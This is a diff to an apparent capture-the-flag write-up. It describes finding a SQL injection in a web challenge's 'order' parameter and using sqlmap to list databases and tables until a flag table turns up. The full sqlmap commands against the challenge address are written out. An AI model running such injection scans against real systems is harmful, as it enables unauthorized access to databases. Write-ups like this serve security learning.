@@ -9,7 +9,8 @@
 ![Main function](./challenge.PNG) 
 *  I try `double quote` and this is server response 
 ![Main function](./sqli.PNG)
-* Run this command in sqlmap `sqlmap -u http://125.235.240.166:20105/index?order=price --time-sec=200 --user-agent=* --dbs --level 5 `i found two databases, but i only attention `vannd` 
+* Run this command in sqlmap `sqlmap -u http://125.235.240.166:20105/index?order=price --time-sec=200 --user-agent=* --dbs --level 5 `
+* I found two databases, but i only attention `vannd` 
 ![Main function](./sqlmap0.PNG)
 * Then i usage command `sqlmap -u http://125.235.240.166:20105/index?order=price --tables -D vannd` for scan `vannd` table 
 * Finally i found a table contain flag =))))
